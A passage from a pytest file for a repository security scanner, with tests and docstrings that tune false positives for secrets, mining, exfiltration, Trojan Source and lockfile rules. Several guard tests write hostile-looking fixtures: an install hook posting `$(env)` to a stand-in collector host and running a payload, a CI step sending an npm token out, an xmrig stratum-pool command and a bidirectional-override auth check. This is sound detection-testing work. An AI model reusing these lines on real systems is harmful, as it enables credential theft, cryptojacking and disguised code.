    Reported at CRITICAL, eight times, on a file whose own docstring opens "Keys and
    certificates for tests" and names the script that generated them. That is the
    shape that gets a secret scanner switched off: the project cannot act on it,
    cannot delete the keys, and has nothing to do but suppress the rule.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "t/unit/security/__init__.py",
            "t/integration/test_canvas.py",
            "pkg/mocks/client.go",
            "src/__mocks__/api.ts",
            "internal/golden/output.json",
            "spec/fixtures/key.pem",
            "e2e/support/commands.js",
            "samples/quickstart/config.yaml",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    @pytest.mark.parametrize(
        "path",
        ["celery/app/base.py", "src/main.rs", "cmd/server/main.go", "lib/client.rb"],
    )
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material(path)


class TestACredentialInDocumentationIsUsuallyAFormat:
    """Celery's SQS page carries a broker URL whose access key is the alphabet in
    order, and two lines below it the same URL written with
    `aws_access_key_id:aws_secret_access_key` as the format. The first was reported
    at HIGH.

    Ceilinged rather than suppressed, and the distinction matters: a real key pasted
    into a README leaks exactly as far as one in a settings file, and plenty have
    been. It stays in the report, below the severity that fails a build, with a
    caveat saying why.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "docs/getting-started/brokers/sqs.rst",
            "README.md",
            "CONTRIBUTING.md",
            "doc/configuration.txt",
            "notebooks/demo.ipynb",
            "config/app.yaml.example",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert is_documentation(path)

    @pytest.mark.parametrize("path", ["src/settings.py", "app/config.ts", "main.go"])
    def test_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert not is_documentation(path)

    def test_a_key_in_a_readme_is_reported_below_blocking(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "README.md").write_text(
            f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        hits = [f for f in result.findings if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"]
        assert hits, "a credential in documentation must still be reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)
        assert all("documentation" in f.message for f in hits)


class TestADoctestIsDocumentation:
    """Django's template parser documents itself with a doctest line assigning a
    filter expression to a local called `token`, and the assignment rule read the
    filter expression as a credential assigned to it. A transcript is prose that
    happens to be executable, and a value in one illustrates a format by
    construction.
    """

    @pytest.mark.parametrize(
        "line",
        [
            ">>> token = 'variable{0}default:\"Default value\"'",
            "... token = 'variable{0}default:\"Default value\"'",
            "$ export AUTH_TOKEN=" + assemble("aB3kQ9mZ", "2xT7vL4nR8wY"),
            "In [3]: token = 'variable{0}default:\"Default value\"'",
        ],
    )
    def test_a_transcript_line_is_an_example(self, tmp_path, line: str) -> None:
        (tmp_path / "base.py").write_text(
            f'"""\nSample::\n\n    {line.format("|")}\n"""\n', encoding="utf-8"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_an_ordinary_assignment_still_fires(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "settings.py").write_text(f'SECRET_KEY = "{value}"\n', encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestAWindowsEnvironmentReferenceIsNotAValue:
    """Django's documentation extension builds `token = "%HOMEPATH%\\\\" + token[2:]`,
    which the assembled-literal path folded into a value assigned to something
    called `token` and reported at HIGH.

    `%VAR%` says the value arrives from the environment exactly as plainly as `$VAR`
    does, and the POSIX form was already here. Any build script that touches Windows
    paths is full of it.
    """

    @pytest.mark.parametrize(
        "value", [rb"%HOMEPATH%\\", rb"%USERPROFILE%/.config", rb"%APPDATA%\\cordon"]
    )
    def test_it_is_a_placeholder(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(value)

    def test_a_real_value_is_not(self) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert not PLACEHOLDER.search(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode())


class TestAnUnderscoredNameIsStillAName:
    """`INTERNAL_RESET_SESSION_TOKEN = "_password_reset_token"` at HIGH. The value is
    a session key NAME, and the identifier alternative in `NOT_A_SECRET` required the
    first character to be a letter -- so a leading underscore, which is how Python
    spells "private", made an obvious identifier unrecognisable.
    """

    @pytest.mark.parametrize(
        "value", [b"_password_reset_token", b"_auth_token_cache", b"_internal_secret_key"]
    )
    def test_it_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value)

    def test_key_material_is_still_key_material(self) -> None:
        assert NOT_A_SECRET.match(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode()) is None


class TestAGpgFingerprintIsNotAWalletAddress:
    """`vuejs/core` reported at HIGH for "Cryptocurrency mining", on a file that is
    six lines of JSON declaring where to send sponsorship money.

    `0x` followed by forty hex characters is an Ethereum address. It is also exactly
    how every apt and yum repository writes a signing key, so Ansible's `apt_key`
    documentation and its apt integration tests were reported the same way -- and so
    would every repository that configures a third-party apt source.

    The composite above promotes any single `mine` capability to HIGH, so one
    forty-character hex string was the whole of the evidence for a mining accusation.
    The composite's own message says it "references a mining pool protocol, a pool
    host or a miner binary" and does not mention a wallet at all, which is the same
    shape of defect as the `pull_request_target` rule: a message claiming more than
    the match requires.
    """

    @staticmethod
    def wallet_pattern():
        from cordon_scanner.rules.loader import RuleLoader

        for pack in RuleLoader.load_builtin():
            for rule in pack.rules:
                if rule.id == "CAP.MINE.WALLET.001":
                    return rule.match.regex
        raise AssertionError("CAP.MINE.WALLET.001 is not in the built-in packs")

    #: A forty-character hex fingerprint, assembled at call time. This file is
    #: scanned by the tool it tests and the tool gets no exception for its own suite.
    @staticmethod
    def fingerprint() -> str:
        return assemble("0x", "D06AAF4C11DAB86DF42", "1421EFE6B20ECA7AD98A1")

    @staticmethod
    def address() -> str:
        """A Monero address, not an Ethereum one.

        The Ethereum alternative was removed from `CAP.MINE.WALLET.001` after three
        rounds of negative lookbehinds failed to separate it from a GPG fingerprint:
        `0x` plus forty hex characters is the same string either way, and Ansible's
        `apt_key` documentation still produced a cryptominer finding from
        `id: 0x9FED2BCB...`. Monero is the currency cryptojacking actually uses and its
        ninety-five characters are a shape nothing else produces.
        """
        alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        return assemble("4A", (alphabet * 3)[:93])

    @pytest.mark.parametrize(
        "template",
        [
            "url: https://keyserver.ubuntu.com/pks/lookup?op=get&search={0}",
            "# http://keyserver.ubuntu.com:11371/pks/lookup?search={0}&op=index",
            "gpg --recv-keys {0}",
            "apt-key adv --keyid {0}",
            # The label nobody can enumerate in advance, which is what ended the
            # lookbehind approach: Ansible's apt_key documentation writes it this way.
            "    id: {0}",
            "ownedBy: '{0}'",
        ],
    )
    def test_a_signing_key_is_not_a_payout_address(self, template: str) -> None:
        assert self.wallet_pattern().search(template.format(self.fingerprint()).encode()) is None

    @pytest.mark.parametrize("template", ["WALLET = '{0}'", "payout_address={0}"])
    def test_a_payout_address_still_matches(self, template: str) -> None:
        assert self.wallet_pattern().search(template.format(self.address()).encode()) is not None

    def test_a_sponsorship_manifest_is_not_mining(self, tmp_path) -> None:
        """GitHub reads this exact filename, and an address in it was published on
        purpose as somewhere to send money."""
        owner = assemble("0x", "5393BdeA2a020769256d", "9f337B0fc81a2F64850A")
        (tmp_path / "FUNDING.json").write_text(
            '{\n  "drips": {\n    "ethereum": {\n'
            f'      "ownedBy": "{owner}"\n'
            "    }\n  }\n}\n",
            encoding="utf-8",
        )
        assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)

    def test_a_real_miner_still_fires(self, tmp_path) -> None:
        """The guard. Stratum exists for mining and nothing else, which is the
        evidence the composite's message actually describes."""
        # Split across every indicator: the miner binary name, the protocol scheme
        # and the pool host each match on their own.
        miner = assemble("xm", "rig")
        pool = assemble("stratum", "+tcp://", "pool.", "minexmr", ".com:4444")
        (tmp_path / "run.sh").write_text(
            f"#!/bin/sh\n./{miner} -o {pool} -u {self.address()}\n", encoding="utf-8"
        )
        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)


class TestAnExampleOfAnAttackIsNotAnAttack:
    """The composites and the obfuscation rules had no severity ceiling for test
    material, which the secrets detector has always had.

    `bandit/examples/marshal_deserialize.py` is the clearest case: a file whose
    entire purpose is to be an example of unsafe deserialisation, in a security
    tool's `examples/` directory, reported at HIGH as decode-and-execute. The finding
    is not wrong about what the file does. It is wrong about what a reader should do
    next.

    Bandit's `plugins/trojansource.py` is the same thing one step further in: the
    plugin that DETECTS Trojan Source attacks has to contain the characters it
    detects, and it was reported for containing them. Every scanner in this category
    hits that on its own corpus, and on every repository that vendors security rules.

    A ceiling, not a suppression, and the ordering matters in both places: the
    install-hook escalation is applied after, so a payload under `tests/` that runs
    at install time still reaches CRITICAL. MALICIOUS findings are never ceilinged --
    a dropper in a fixture directory is still a dropper.
    """

    def test_an_example_of_unsafe_deserialisation_is_not_blocking(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        examples = tmp_path / "examples"
        examples.mkdir()
        (examples / "marshal_deserialize.py").write_text(
            "import marshal, base64\n\nmarshal.loads(base64.b64decode(DATA))\n",
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
        assert decode, "the pattern is still reported"
        assert all(f.severity <= Severity.MEDIUM for f in decode)

    def test_the_same_file_in_application_code_still_blocks(self, tmp_path) -> None:
        """The guard that makes the test above mean something."""
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "loader.py").write_text(
            "import marshal, base64\n\nmarshal.loads(base64.b64decode(DATA))\n",
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
        assert decode and any(f.severity >= Severity.HIGH for f in decode)

    def test_a_trojan_source_fixture_is_not_a_trojan(self, tmp_path) -> None:
        """Bandit ships `examples/trojansource.py`, the sample its Trojan Source
        plugin was written against, and it was reported at HIGH for containing the
        characters it exists to demonstrate.

        Its `plugins/trojansource.py` -- the detector itself -- is NOT covered by
        this and still reports at HIGH. That is honest rather than ideal: the file is
        ordinary application code by every signal available, and the only thing
        separating it from a file carrying an override is intent. The CAP.MINE rules
        solve the same problem with a narrow exclusion for rule-definition file
        paths; there is no equivalent convention for a detector written in Python,
        and inventing one that matched `**/plugins/**` would exempt a directory
        every framework on earth has.
        """
        from cordon_scanner.core.models import Severity

        examples = tmp_path / "examples"
        examples.mkdir()
        (examples / "trojansource.py").write_text(
            f"BIDI = [\n    '{chr(0x202E)}',  # right-to-left override\n]\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        # Reported, because the characters really are there, and not at a severity
        # that fails a build, because the file's job is to hold them.
        assert bidi
        assert all(f.severity <= Severity.MEDIUM for f in bidi)

    def test_an_override_in_application_code_still_blocks(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "auth.py").write_text(
            f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert bidi and any(f.severity >= Severity.HIGH for f in bidi)


class TestTokenMeansTwoThings:
    """Measured across 338 of the most-starred repositories on GitHub,
    `SECRET.GENERIC.ASSIGNMENT.001` fired at blocking severity in 42% of them. No
    plausible world has four in ten of the best-read codebases on the internet
    leaking credentials.

    The largest single cause was one English word with two unrelated meanings. The
    credential keyword was allowed to run into anything that followed it, which made
    it a PREFIX test: `tokenizer` was reported as a credential, and so were
    `maxTokens`, `promptTokens`, `completionTokens` and `max_new_tokens` -- counts in
    every codebase that talks to a language model -- and `tokens`, which is usually a
    lexer's output.

    The keyword now has to be a whole word: a suffix is accepted only when it starts
    the way a new word starts, with a separator or a capital.
    """

    VALUE = ("aB3kQ9mZ", "2xT7vL4nR8wY")

    def fires(self, name: str) -> bool:
        return ASSIGNMENT.search(f'{name} = "{assemble(*self.VALUE)}"'.encode()) is not None

    @pytest.mark.parametrize(
        "name",
        [
            "tokenizer",
            "maxTokens",
            "promptTokens",
            "completionTokens",
            "max_new_tokens",
            "tokens",
            "JoinTokens",
            "secretsmanager",
        ],
    )
    def test_a_different_word_is_not_a_credential(self, name: str) -> None:
        assert not self.fires(name)

    @pytest.mark.parametrize(
        "name",
        [
            "GITHUB_TOKEN",
            "api_key",
            "privateKey",
            "accessToken",
            "SECRET_KEY_BASE",
            "access_token_value",
            "accessTokenValue",
            "password",
            "client_secret",
            "AUTH_TOKEN",
        ],
    )
    def test_a_credential_name_still_fires(self, name: str) -> None:
        assert self.fires(name)

    def test_passphrase_was_added_while_narrowing(self) -> None:
        """`pass` followed by lowercase letters is now refused, which would have lost
        `passphrase` -- a real credential name -- so it is named in the keyword list
        rather than left to the prefix behaviour that used to cover it."""
        assert self.fires("passphrase")


class TestANameSaysWhatItHolds:
    """Three more shapes behind the same rule, all of them names that describe a
    credential rather than being one.

    `AntiforgeryTokenFieldName` in ASP.NET Core, `awsContainerAuthorizationTokenEnv`
    in the AWS SDK and `SpiffeJwtNormalizedTokenUnits` in Vault were all reported.
    Every one ends in a word already on the configuration list, and every one spells
    its compound in CamelCase, which the split could not see.

    `vaultPathTokenCreate` and eight siblings hold API routes like
    "auth/token/create". Those end in `create`, and the word that matters is in the
    middle -- so location words are checked anywhere in the name, which a suffix test
    cannot do.
    """

    @pytest.mark.parametrize(
        "name",
        [
            "AntiforgeryTokenFieldName",
            "awsContainerAuthorizationTokenEnv",
            "SpiffeJwtNormalizedTokenUnits",
            "credentialType",
            "CredentialScope",
            "SecretEngineCounts",
            "Auth_VerifyTokenAuthority_FullMethodName",
        ],
    )
    def test_camel_case_is_split(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize(
        "name",
        [
            "vaultPathTokenCreate",
            "vaultPathTokenRevokeSelf",
            "vaultPathTokenLookup",
            "TOKEN_URL_OVERRIDE",
            "secret_endpoint_template",
        ],
    )
    def test_a_location_word_anywhere_is_enough(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize(
        "name", ["SECRET_KEY", "api_key", "DEMO_PASSWORD", "privateKey", "TOTPSecret"]
    )
    def test_a_credential_name_is_untouched(self, name: str) -> None:
        assert not names_configuration(name)


class TestWhereTheRestOfTheWorldKeepsItsFixtures:
    """Vault had twenty-one private keys reported at CRITICAL under
    `api/test-fixtures/keys/`, `command/agent/test-fixtures/reload/` and six more
    directories -- every one a certificate generated for a TLS reload test.

    `fixtures/` was on the list. `test-fixtures/`, with the hyphen, was not.

    The same run turned up `ui/mirage/factories/` (Mirage exists to produce
    plausible-looking data, so a generated password is the point of the file) and
    `integtest/`, which is an integration-test directory that does not spell it
    "integration".
    """

    @pytest.mark.parametrize(
        "path",
        [
            "api/test-fixtures/keys/key.pem",
            "command/agent/test-fixtures/reload/reload_bar.key",
            "internal/testdata/cert.pem",
            "command/agent/testing.go",
            "pkg/testutil/helpers.go",
            "ui/mirage/factories/ldap-credential.js",
            "spec/factories/users.rb",
            "command/auth/kerberos/integtest/integrationtest.sh",
            "tls/testcerts/server.key",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    @pytest.mark.parametrize(
        "path", ["vault/login_mfa.go", "src/auth/session.ts", "lib/credentials.rb"]
    )
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material(path)


class TestPublishingIsNotExfiltration:
    """`SUSPECT.EXFIL.001`, `SUSPECT.DROPPER.001` and `SUSPECT.ANTI_ANALYSIS.001` each
    fired in a fifth to a third of all repositories measured, and for all three
    roughly HALF the findings were in the project's own build and release tooling:
    `scripts/dist.sh`, `packaging/utils/coverity-scan.sh`,
    `.buildkite/scripts/dra-workflow.trigger.sh`, `setup.py`.

    Each of those reads a token from the environment, calls an API and runs a
    command. That is credential plus egress plus spawn, which is the composite. It is
    also what publishing a release IS. The composite's own source already named this
    shape as the problem -- "a deploy script that pushes and posts to Slack" is in the
    comment explaining why a third signal was added -- and it was still firing on
    exactly that.

    A ceiling, with three things keeping it from being a hole: MALICIOUS is never
    ceilinged, the install-hook escalation is applied afterwards so anything running
    unprompted still reaches CRITICAL, and a script here runs when somebody runs it,
    which is not the threat the composites are calibrated for.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "scripts/dist.sh",
            "packaging/utils/coverity-scan.sh",
            ".buildkite/scripts/dra-workflow.trigger.sh",
            ".github/actions/pr_diff/script.sh",
            "setup.py",
            "Makefile",
            "dev/breeze/src/airflow_breeze/utils/run_utils.py",
            "hack/verify-gofmt.sh",
            "tools/release/publish.js",
        ],
    )
    def test_build_tooling_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert is_build_tooling(path)

    @pytest.mark.parametrize(
        "path",
        [
            "web/public/pdf.worker.min.mjs",
            ".yarn/releases/yarn-4.17.1.cjs",
            ".github/actions/needs-triage/dist/index.js",
            "session/auth/auth_grpc.pb.go",
            "proto/service_pb2.py",
        ],
    )
    def test_generated_output_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_generated_artefact

        assert is_generated_artefact(path)

    @pytest.mark.parametrize(
        "path",
        [
            # Somebody else's SOURCE, deliberately not ceilinged: that is exactly
            # where a supply-chain payload lives, and blunting the rules there would
            # blunt them where they matter most.
            "vendor/github.com/moby/buildkit/session/auth.go",
            "node_modules/left-pad/index.js",
            "src/app/main.py",
        ],
    )
    def test_vendored_source_and_application_code_are_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling, is_generated_artefact

        assert not is_build_tooling(path)
        assert not is_generated_artefact(path)

    def test_a_release_script_is_reported_below_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "dist.sh").write_text(
            "#!/bin/sh\n"
            'TOKEN="$GITHUB_TOKEN"\n'
            'curl -H "Authorization: $TOKEN" -d @dist.tgz https://uploads.example.test/r\n'
            "tar czf dist.tgz ./build\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        exfil = [f for f in result.findings if f.rule_id.startswith("SUSPECT.EXFIL")]
        assert all(f.severity <= Severity.MEDIUM for f in exfil)

    def test_the_same_script_run_at_install_time_still_blocks(self, tmp_path) -> None:
        """The ordering that keeps the ceiling safe: the install-hook escalation is
        applied after it, so code that runs unprompted is unaffected."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "dist.sh").write_text(
            '#!/bin/sh\ncurl -d "$(env)" https://collector.example.invalid/r\nsh ./payload\n',
            encoding="utf-8",
        )
        (tmp_path / "package.json").write_text(
            '{"name":"x","version":"1.0.0","scripts":{"postinstall":"sh scripts/dist.sh"}}\n',
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        hits = [f for f in result.findings if f.location.path.endswith("scripts/dist.sh")]
        assert any(f.severity >= Severity.HIGH for f in hits), [
            (f.rule_id, str(f.severity)) for f in hits
        ]


class TestALocalCrateHasNothingToHashAgainst:
    """`POLICY.LOCKFILE.INTEGRITY.001` fired in 231 of 535 repositories measured --
    43%, the highest-spread rule in the tool -- on a fact of Cargo's file format.

    `Cargo.lock` omits the `source` line for every workspace member, because the
    crate is in this repository. `is_registry_host(None)` returns True for every
    ecosystem: an absent URL is not evidence of anything, and treating it as evidence
    of the registry turned ripgrep's ten `grep-*` crates, its own entry, `globset`
    and `ignore` into registry packages whose hashes had gone missing. About 17% of
    the entries, which is under the 90% "this format carries no hashes" threshold, so
    it reported at HIGH.

    The fix is on the parser, not on `is_registry_host`: only the parser knows what
    an absent field means in its own format. `LockEntry.local` and `Dependency.local`
    carry that answer to the two rules that need it.
    """

    CARGO_LOCK = """version = 4

[[package]]
name = "ripgrep"
version = "14.1.1"
dependencies = [
 "grep",
 "anyhow",
]

[[package]]
name = "grep"
version = "0.3.2"

[[package]]
name = "anyhow"
version = "1.0.104"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "330a5ed07fa54e4702c9d6c4174f74427fc0ef6e214bbd677ae50a5099946470"
"""

    def test_a_workspace_member_is_marked_local(self) -> None:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.ecosystems.registry import EcosystemRegistry

        raw = self.CARGO_LOCK.encode()
        content = FileContent(path="Cargo.lock", raw=raw, size=len(raw))
        graph = EcosystemRegistry.get("cargo").parse_lockfile(content)
        by_name = {e.name: e for e in graph.entries}
        assert by_name["ripgrep"].local, "the workspace root has no source line"
        assert by_name["grep"].local, "a path member has no source line"
        assert not by_name["anyhow"].local, "a registry crate does"

    @staticmethod
    def rule_ids(root) -> set[str]:
        """Every rule id, across every category.

        Not `flagged`, which keeps only MALICIOUS and SUSPICIOUS findings -- and both
        of these rules are POLICY. The first version of these tests used `flagged`, and
        the "is not reported" half passed for the wrong reason: the id could never have
        appeared in that set whether the fix worked or not.
        """
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {f.rule_id for f in result.findings}

    def test_a_rust_workspace_is_not_reported(self, tmp_path) -> None:
        (tmp_path / "Cargo.lock").write_text(self.CARGO_LOCK, encoding="utf-8")
        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "ripgrep"\nversion = "14.1.1"\n', encoding="utf-8"
        )
        found = self.rule_ids(tmp_path)
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in found, found
        assert "POLICY.DEPENDENCY.INTEGRITY.001" not in found, found

    def test_a_registry_crate_with_no_checksum_still_is(self, tmp_path) -> None:
        """The guard. A real registry entry that lost its hash is the anomaly this
        rule exists for, and it must survive the fix."""
        (tmp_path / "Cargo.lock").write_text(
            self.CARGO_LOCK + '\n[[package]]\nname = "serde"\nversion = "1.0.2"\n'
            'source = "registry+https://github.com/rust-lang/crates.io-index"\n',
            encoding="utf-8",
        )
        found = self.rule_ids(tmp_path)
        assert "POLICY.LOCKFILE.INTEGRITY.001" in found, found


class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
    """`SUSPECT.POLYGLOT.MISMATCH.001` produced 1,022 findings across 100 of 535
    repositories. The binary detector was the last one with no severity ceiling for
    test material, and a format-mismatch rule needs one more than most.

    FFmpeg's `tests/ref/lavf/apng.png` and its siblings are reference outputs for
    format tests. Ladybird ships `Tests/LibWeb/.../images/broken.png`, which is
    broken on purpose and says so in its name. Django's `tests/files/brokenimg.png`
    contains four bytes.
    """

    def test_a_deliberately_broken_fixture_is_not_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        tests = tmp_path / "tests" / "files"
        tests.mkdir(parents=True)
        (tests / "brokenimg.png").write_bytes(b"123\n")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        mismatch = [f for f in result.findings if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"]
        assert mismatch, "the mismatch is still reported"
        assert all(f.severity <= Severity.MEDIUM for f in mismatch)

    def test_the_same_file_in_application_code_still_blocks(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        assets = tmp_path / "static" / "img"
        assets.mkdir(parents=True)
        (assets / "logo.png").write_bytes(b"#!/bin/sh\necho hello\n")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        mismatch = [f for f in result.findings if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"]
        assert mismatch and any(f.severity >= Severity.HIGH for f in mismatch)


class TestAnEphemeralJobTokenIsNotASecretToLeak:
    """`SUSPECT.CI.SECRET_EGRESS.001` fired in 31% of 535 repositories, and every
    sampled finding was an ordinary workflow: `release-milestone.yml`,
    `upload-test-stats.yml`, `notify-on-merge.yml`, `label_stale_issues.yml`,
    `send_release_notification.yml`.

    `secrets.GITHUB_TOKEN` is not a secret the repository holds. GitHub mints it per
    job, scopes it to that repository, and revokes it when the job ends -- there is
    nothing to rotate and nothing that outlives the job. Using it with `curl` or `gh`
    against the GitHub API is the most common thing in all of CI.

    The rule's own notes record that it was split out of the critical rule because it
    fired on "every pipeline publishing something with its own credential". It was
    still doing exactly that, one severity down.
    """

    @staticmethod
    def fires(workflow: str) -> bool:
        from cordon_scanner.detect.config_files import RULES, ConfigDetector

        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CI.SECRET_EGRESS.001")
        raw = workflow.encode()
        return rule.pattern.search(ConfigDetector._without_comments(raw)) is not None

    def test_the_job_token_against_the_github_api_is_ordinary(self) -> None:
        assert not self.fires(
            "jobs:\n  notify:\n    steps:\n"
            '      - run: curl -H "Authorization: ${{ secrets.GITHUB_TOKEN }}"'
            " https://api.github.com/repos/x/y/issues\n"
        )

    def test_a_named_user_secret_still_fires(self) -> None:
        """The guard: a secret the project owns, going somewhere this cannot check, is
        the observation the rule exists to make."""
        assert self.fires(
            "jobs:\n  leak:\n    steps:\n"
            '      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://collector.invalid/i\n'
        )

    def test_it_reports_below_blocking(self) -> None:
        """What separates publishing from exfiltration is where the data goes, and the
        rule's own message says it cannot decide that. A finding worth a reviewer's eye
        is not a finding worth failing a build, and this shape is far too common to
        block on -- the critical rule for a serialised secret context is untouched."""
        from cordon_scanner.core.models import Severity
        from cordon_scanner.detect.config_files import RULES

        egress = next(r for r in RULES if r.rule_id == "SUSPECT.CI.SECRET_EGRESS.001")
        exfil = next(r for r in RULES if r.rule_id == "MALWARE.CI.SECRET_EXFIL.001")
        assert egress.severity <= Severity.MEDIUM
        assert exfil.severity >= Severity.CRITICAL


class TestATrojanSourceAttackNeedsAReader:
    """`SUSPECT.OBFUSCATION.BIDI.001` produced 285 findings across 535 repositories,
    and the files were DuckDB's `.parquet` test data, Bevy's `.glb` models, Wails's
    compiled `Assets.car`, an After Effects `.aep`, an `.m4v`, a PhotoPrism `.xmp`
    sidecar, and TensorFlow's `icu_conversion_data.c.gz.afu` -- a character-encoding
    conversion table, which is a file whose entire purpose is to contain every
    codepoint there is.

    Trojan Source works because a REVIEWER reads one thing and a COMPILER acts on
    another. A file nobody reviews as text cannot be attacked that way, so a
    directional codepoint in one is a byte sequence rather than a deception.

    `language is None` is the gate `_long_lines` already applied, on reasoning written
    there years before this: a file with no identified language is data.
    """

    def test_a_data_file_is_not_an_attack(self, tmp_path) -> None:
        (tmp_path / "fixture.parquet").write_bytes(
            b"PAR1" + f"label{chr(0x202E)}value".encode() + b"\x00" * 64 + b"PAR1"
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)

    def test_an_encoding_table_is_not_an_attack(self, tmp_path) -> None:
        (tmp_path / "icu_conversion_data.c.gz.afu").write_bytes(
            "".join(chr(c) for c in (0x202A, 0x202B, 0x202C, 0x202D, 0x202E)).encode()
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)

    def test_source_is_still_checked(self, tmp_path) -> None:
        """The guard. A directional override in code a human reviews is the attack,
        and narrowing to source must not be narrowing to nothing."""
        (tmp_path / "auth.py").write_text(
            f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)


class TestDoingItCorrectlyIsNotTheSameAsDoingItCarelessly:
    """`SUSPECT.CONTAINER.FETCH_EXEC.001` reported at HIGH on two Dockerfiles that
    are not remotely equivalent.

    Elasticsearch pins a release URL and then runs
    `echo "${tini_sum}  /tmp/tini" | sha256sum -c -`. That is precisely the control
    the rule's own remediation asks for -- "verify a pinned digest before executing".

    Vault runs `curl -sL https://deb.nodesource.com/setup_20.x | bash -`, which
    verifies nothing at all.

    Reporting both at the same severity tells a project that doing it properly and
    doing it carelessly are equally bad, which is how a rule stops being read.

    Demoted by one step rather than suppressed: a verified fetch is still a fetch, the
    bytes are pinned but the build still reaches the network, and that is worth a line
    in the report.
    """

    VERIFIED = (
        "FROM rockylinux:9\n"
        "RUN set -e ; \\\n"
        '    tini_sum="5be6b4f9ba4bf5b9b59bda1a37d4ad2e6b30b6e0a0f9bbbbbbbbbbbbbbbbbbbb" ; \\\n'
